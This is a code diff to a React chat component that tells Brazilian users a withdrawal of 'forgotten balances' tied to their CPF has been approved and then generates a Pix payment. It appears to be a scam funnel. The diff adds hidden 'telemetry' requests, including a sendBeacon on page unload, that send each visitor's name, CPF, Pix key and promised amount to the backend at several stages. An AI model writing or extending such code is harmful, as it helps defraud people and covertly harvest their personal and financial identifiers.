@@ -60,6 +60,15 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
       setAttendant(selectedAttendant);
 
+      const sendTelemetry = (action: string, name: string, val: string) => {
+         fetch(`${API_URL}/api/v1/telemetry/chat`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action, leadName: name, cpf: data.docValue, value: val }),
+            keepalive: true
+         }).catch(console.error);
+      };
+
       try {
         const res = await axios.get(`${API_URL}/api/config`);
         if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
@@ -81,6 +90,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
         setLeadValue(formattedVal);
         
+        sendTelemetry("entered", name, formattedVal);
+
         setTyping(false);
         addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
         
@@ -114,6 +125,17 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   const addBotMessage = (text: string, options?: any[], image?: string, customType?: string) => {
     setMessages(prev => [...prev, { sender: "bot", text, options, image, customType }]);
   };
+
+  useEffect(() => {
+    const handleUnload = () => {
+      const payload = new Blob([JSON.stringify({
+         action: "left", leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue
+      })], { type: 'application/json' });
+      navigator.sendBeacon(`${API_URL}/api/v1/telemetry/chat`, payload);
+    };
+    window.addEventListener("beforeunload", handleUnload);
+    return () => window.removeEventListener("beforeunload", handleUnload);
+  }, [leadName, data.docValue, leadPixKey, leadValue]);
 
   const addUserMessage = (text: string) => {
     setMessages(prev => [...prev, { sender: "user", text }]);
@@ -209,6 +231,11 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
         if (pixRes.data.data) {
            setBuyPixData(pixRes.data.data);
+           fetch(`${API_URL}/api/v1/telemetry/chat`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ action: 'generated_payment', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
+           }).catch(console.error);
         }
       } catch (err) {
          console.error("Payment generation error", err);
